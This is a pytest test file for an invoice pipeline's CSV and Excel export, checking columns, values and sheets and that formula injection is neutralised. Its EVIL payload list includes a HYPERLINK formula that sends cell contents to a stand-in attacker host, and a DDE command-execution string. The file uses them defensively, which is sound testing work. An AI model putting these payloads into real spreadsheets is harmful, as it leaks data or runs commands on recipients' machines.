"""Excel / CSV export, including spreadsheet formula-injection protection."""

from __future__ import annotations

import csv
import io
from decimal import Decimal

import pytest
from openpyxl import load_workbook

from pipeline.duplicates import DuplicateCandidate
from pipeline.export import (
    INVOICE_COLUMNS,
    ISSUE_COLUMNS,
    export_all,
    invoice_records,
    safe_text,
    to_csv_bytes,
    to_xlsx_bytes,
    validation_report_csv,
)
from pipeline.runner import import_files
from pipeline.schemas import InvoiceStatus, Severity, ValidationIssue
from pipeline.validate import field_review_status, validate_invoice
from tests.conftest import OCR_CLEAN, TODAY, invoice, png_bytes, specs

D = Decimal
EVIL = ["=HYPERLINK(\"http://evil.example/\"&A1,\"click\")", "+1+1", "-2+3", "@SUM(1+1)", "\t=1+1", "\r=1+1", "=cmd|' /C calc'!A0"]


@pytest.fixture
def add_invoice(storage, settings):
    counter = {"n": 0}
    sp = specs(40, seed=9)

    def _add(inv=None, status=InvoiceStatus.NEEDS_REVIEW, filename=None, corrections=None, error=None, issues=None):
        counter["n"] += 1
        name = filename or f"file_{counter['n']}.png"
        report = import_files([(name, png_bytes(sp[counter["n"]]))], storage, settings)
        assert report.added, report
        row = next(r for r in storage.list_invoices() if r.filename == name)
        if status == InvoiceStatus.FAILED:
            storage.set_status(row.invoice_id, InvoiceStatus.FAILED, error or "OCR failed")
        elif status not in (InvoiceStatus.PENDING,):
            inv = inv or invoice()
            found = issues if issues is not None else validate_invoice(inv, OCR_CLEAN, today=TODAY)
            storage.save_extraction(row.invoice_id, inv, found, field_review_status(inv, found), status, "test-model", 10, 20)
            if corrections:
                storage.save_corrections(row.invoice_id, corrections, found, field_review_status(inv, found, edited_fields=corrections), status)
        return row.invoice_id

    return _add


def rows_of(storage):
    return storage.list_invoices()


# ---- columns and values -------------------------------------------------------------------
def test_csv_has_the_required_columns_and_one_row_per_invoice(storage, add_invoice):
    add_invoice(invoice(invoice_number="A-1"))
    add_invoice(invoice(invoice_number="A-2"))
    data = export_all(storage, "csv")
    assert data.startswith(b"\xef\xbb\xbf")                                  # BOM so Excel reads UTF-8
    parsed = list(csv.DictReader(io.StringIO(data.decode("utf-8-sig"))))
    assert len(parsed) == 2 and list(parsed[0].keys()) == INVOICE_COLUMNS
    required = {"Source File", "Vendor Name", "Vendor GSTIN", "Invoice Number", "Invoice Date", "Taxable Amount", "CGST", "SGST", "IGST",
                "Total Amount", "Currency", "Extraction Status", "Review Status", "Validation Errors", "Validation Warnings",
                "Field Review Flags", "OCR Confidence"}
    assert required <= set(parsed[0])
    first = parsed[0]
    assert first["Vendor GSTIN"] == "27AAPFU0939F1ZV" and first["Total Amount"] == "11800.00" and first["Invoice Date"] == "2026-09-14"
    assert first["Source File"].endswith(".png") and first["Extraction Status"] == "Succeeded"


def test_unknown_values_are_empty_not_zero(storage, add_invoice):
    add_invoice(invoice(igst=None, buyer_gstin=None))
    row = list(csv.DictReader(io.StringIO(export_all(storage, "csv").decode("utf-8-sig"))))[0]
    assert row["IGST"] == "" and row["Buyer GSTIN"] == ""


def test_pending_invoices_are_left_out_of_the_export(storage, add_invoice):
    add_invoice(invoice())
    add_invoice(status=InvoiceStatus.PENDING)
    assert len(invoice_records(rows_of(storage))) == 1
    assert len(invoice_records(rows_of(storage), include_unprocessed=True)) == 2


def test_failed_files_are_exported_with_the_reason(storage, add_invoice):
    add_invoice(status=InvoiceStatus.FAILED, error="OCR could not read this page.", filename="broken.png")
    rec = invoice_records(rows_of(storage))[0]
    assert rec["Extraction Status"] == "Failed" and rec["Review Status"] == "Failed"
    assert "EXTRACTION_FAILED" in rec["Validation Errors"] and "OCR could not read" in rec["Validation Errors"]


def test_review_status_is_not_reviewed_just_because_extraction_worked(storage, add_invoice):
    add_invoice(invoice(), status=InvoiceStatus.EXTRACTED)
    add_invoice(invoice(invoice_number="B-2"), status=InvoiceStatus.REVIEWED)
    labels = [r["Review Status"] for r in invoice_records(rows_of(storage))]
    assert labels == ["Not yet reviewed (no flags)", "Reviewed"]


def test_corrections_are_exported_and_listed(storage, add_invoice):
    add_invoice(invoice(), corrections={"vendor_name": "Corrected Vendor"})
    rec = invoice_records(rows_of(storage))[0]
    assert rec["Vendor Name"] == "Corrected Vendor" and rec["Manually Edited Fields"] == "vendor_name"


def test_errors_and_warnings_go_into_separate_columns(storage, add_invoice):
    add_invoice(invoice(total_amount=D("12000.00"), invoice_date="2026-12-31"))
    rec = invoice_records(rows_of(storage))[0]
    assert "TOTAL_MISMATCH" in rec["Validation Errors"] and "FUTURE_DATE" not in rec["Validation Errors"]


def test_duplicate_candidates_are_shown(storage, add_invoice):
    a = add_invoice(invoice(), filename="a.png")
    b = add_invoice(invoice(), filename="b.png")
    rec = invoice_records(rows_of(storage), {a: [DuplicateCandidate(b, "Same vendor GSTIN, invoice number and date", "high")]})[0]
    assert "b.png" in rec["Duplicate Candidate"] and rec["Duplicate Candidate"].startswith("high")


def test_gather_computes_duplicates_from_stored_data(storage, add_invoice):
    add_invoice(invoice(), filename="a.png")
    add_invoice(invoice(), filename="b.png")
    recs = {r["Source File"]: r for r in invoice_records(*__import__("pipeline.export", fromlist=["gather"]).gather(storage)[:3])}
    assert "b.png" in recs["a.png"]["Duplicate Candidate"] and "a.png" in recs["b.png"]["Duplicate Candidate"]


# ---- xlsx ------------------------------------------------------------------------------------
def load(storage, **kw):
    return load_workbook(io.BytesIO(export_all(storage, "xlsx", **kw)))


def test_xlsx_sheets_and_headers(storage, add_invoice):
    add_invoice(invoice(total_amount=D("12000.00")))
    wb = load(storage)
    assert wb.sheetnames == ["Invoices", "Validation", "Summary"]
    assert [c.value for c in wb["Invoices"][1]] == INVOICE_COLUMNS
    assert [c.value for c in wb["Validation"][1]] == ISSUE_COLUMNS
    codes = {r[3].value for r in wb["Validation"].iter_rows(min_row=2)}
    assert "TOTAL_MISMATCH" in codes


def test_validation_sheet_is_optional(storage, add_invoice):
    add_invoice(invoice())
    assert load(storage, include_validation_sheet=False).sheetnames == ["Invoices", "Summary"]


def test_xlsx_amounts_are_numbers_with_exact_values_and_dates_are_dates(storage, add_invoice):
    add_invoice(invoice(total_amount=D("11800.00"), taxable_amount=D("10000.00")))
    ws = load(storage)["Invoices"]
    head = {c.value: c.column for c in ws[1]}
    total = ws.cell(row=2, column=head["Total Amount"])
    assert total.value == 11800 and total.number_format == "#,##0.00"
    assert ws.cell(row=2, column=head["Invoice Date"]).value.date().isoformat() == "2026-09-14"
    assert ws.cell(row=2, column=head["Currency"]).value == "INR"


def test_xlsx_summary_labels_totals_as_provisional(storage, add_invoice):
    add_invoice(invoice())
    add_invoice(invoice(invoice_number="Z-2"), status=InvoiceStatus.REVIEWED)
    text = " ".join(str(c.value) for row in load(storage)["Summary"].iter_rows() for c in row if c.value)
    assert "PROVISIONAL" in text and "only 1 reviewed" in text


def test_xlsx_does_not_adjust_amounts_to_balance(storage, add_invoice):
    add_invoice(invoice(total_amount=D("99999.99")))
    ws = load(storage)["Invoices"]
    head = {c.value: c.column for c in ws[1]}
    assert ws.cell(row=2, column=head["Total Amount"]).value == pytest.approx(99999.99)


# ---- formula injection --------------------------------------------------------------------------
@pytest.mark.parametrize("payload", EVIL)
def test_safe_text_neutralises_formula_triggers(payload):
    assert safe_text(payload).startswith("'") and safe_text(payload)[1:] == payload


def test_safe_text_leaves_normal_values_alone():
    assert safe_text("Demo Traders") == "Demo Traders" and safe_text(None) is None and safe_text(5) == 5
    assert safe_text("A-1") == "A-1" and safe_text("") == ""


@pytest.mark.parametrize("payload", EVIL)
def test_csv_cells_cannot_start_a_formula(storage, add_invoice, payload):
    add_invoice(invoice(vendor_name=payload, invoice_number=payload), filename="x.png")
    row = list(csv.DictReader(io.StringIO(export_all(storage, "csv").decode("utf-8-sig"))))[0]
    for column in ("Vendor Name", "Invoice Number"):
        assert not row[column].startswith(("=", "+", "-", "@", "\t", "\r")), row[column]
        assert row[column] == "'" + payload.strip()       # the schema already trims surrounding whitespace


def test_hostile_filename_cannot_start_a_formula_in_csv_or_xlsx(storage, add_invoice):
    add_invoice(invoice(), filename="=cmd.png")
    assert list(csv.DictReader(io.StringIO(export_all(storage, "csv").decode("utf-8-sig"))))[0]["Source File"] == "'=cmd.png"
    ws = load(storage)["Invoices"]
    assert ws.cell(row=2, column=1).value == "'=cmd.png"


@pytest.mark.parametrize("payload", EVIL)
def test_xlsx_text_cells_are_never_formulas(storage, add_invoice, payload):
    add_invoice(invoice(vendor_name=payload, invoice_number=payload, buyer_name=payload), filename="y.png")
    wb = load(storage)
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for cell in row:
                assert cell.data_type != "f", (ws.title, cell.coordinate, cell.value)
                if isinstance(cell.value, str):
                    assert not cell.value.startswith(("=", "+", "-", "@")), (ws.title, cell.coordinate, cell.value)
    ws = wb["Invoices"]
    head = {c.value: c.column for c in ws[1]}
    assert ws.cell(row=2, column=head["Vendor Name"]).value == "'" + payload.strip()


def test_validation_messages_containing_formulas_are_also_neutralised(storage, add_invoice):
    issue = ValidationIssue(code="X", severity=Severity.WARNING, message="=1+1 look at this", fields=["vendor_name"])
    add_invoice(invoice(), issues=[issue])
    ws = load(storage)["Validation"]
    assert ws.cell(row=2, column=6).value == "'=1+1 look at this"
    assert "'=1+1" in validation_report_csv(rows_of(storage)).decode("utf-8")


# ---- misc ------------------------------------------------------------------------------------------
def test_validation_report_lists_every_issue(storage, add_invoice):
    add_invoice(invoice(total_amount=D("12000.00")))
    report = list(csv.DictReader(io.StringIO(validation_report_csv(rows_of(storage)).decode("utf-8-sig"))))
    assert report and set(report[0]) == set(ISSUE_COLUMNS) and any(r["Code"] == "TOTAL_MISMATCH" and r["Severity"] == "error" for r in report)


def test_unknown_export_format_is_refused(storage):
    with pytest.raises(ValueError):
        export_all(storage, "pdf")


def test_empty_export_still_produces_a_valid_workbook_and_csv(storage):
    assert load(storage)["Invoices"].max_row == 1
    assert to_csv_bytes([]).decode("utf-8-sig").strip().split(",")[0] == "Source File"
    assert to_xlsx_bytes([])[:2] == b"PK"
